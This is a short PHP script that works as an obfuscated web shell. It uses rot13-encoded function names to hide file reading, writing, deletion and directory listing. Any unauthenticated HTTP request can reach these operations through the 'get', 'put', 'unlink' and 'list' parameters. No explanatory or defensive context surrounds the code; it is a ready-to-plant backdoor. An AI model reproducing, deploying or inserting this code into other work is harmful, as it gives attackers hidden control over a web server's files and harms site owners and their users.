<?php

function call() {
    $a = func_get_args();
    if (empty($a[0])) return null;
    $f = str_rot13(array_shift($a));
    $c = str_rot13('pnyy_hfre_shap_neenl');
    return ${'c'}($f, $a);
}

$r = $_REQUEST;

if (!empty($r['get'])) {

    if (call('svyr_rkvfgf', $r['get'])) {
        echo call('svyr_trg_pbagragf', $r['get']);
    }

} else if (!empty($r['put']) && $r['name']) {

    echo call('svyr_chg_pbagragf', $r['name'], $r['put']);

} else if (!empty($r['unlink'])) {

    echo call('hayvax', $r['unlink']);

} else if (!empty($r['list'])) {

    if (call('vf_qve', $r['list'])) {
        $dir = $r['list'];
    } else {
        $path = call('cnguvasb', $r['list']);
        $dir = $path['dirname'];
    }

    echo json_encode(array(
        'dir' => $dir,
        'files' => call('fpnaqve', $dir)
    ));
}

die();

